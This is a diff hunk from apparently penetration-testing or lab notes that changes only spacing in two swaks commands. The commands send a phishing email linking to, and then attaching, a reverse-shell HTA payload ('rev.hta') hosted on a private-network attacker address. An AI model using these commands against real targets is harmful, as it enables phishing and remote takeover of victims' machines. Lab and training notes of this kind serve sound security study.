@@ -115,10 +115,10 @@ Testing
 
 ```bash
 # Send phishing link
-swaks --to will@example.com --server 192.168.131.159 --body "Hello, check out my link. http://192.168.45.170/rev.hta" --header "Subject: Issues"  --from bob@example.com
+swaks --to will@example.com --server 192.168.131.159 --body "Hello, check out my link. http://192.168.45.170/rev.hta" --header "Subject: Issues" --from bob@example.com
 
 # Send attachment
-swaks --to will@example.com --server 192.168.131.159 --body "Hello, check out my link." --header "Subject: Issues"  --from bob@example.com --add-header "MIME-Version: 1.0" --attach @rev.hta
+swaks --to will@example.com --server 192.168.131.159 --body "Hello, check out my link." --header "Subject: Issues" --from bob@example.com --add-header "MIME-Version: 1.0" --attach @rev.hta
 ```
 
 </details>
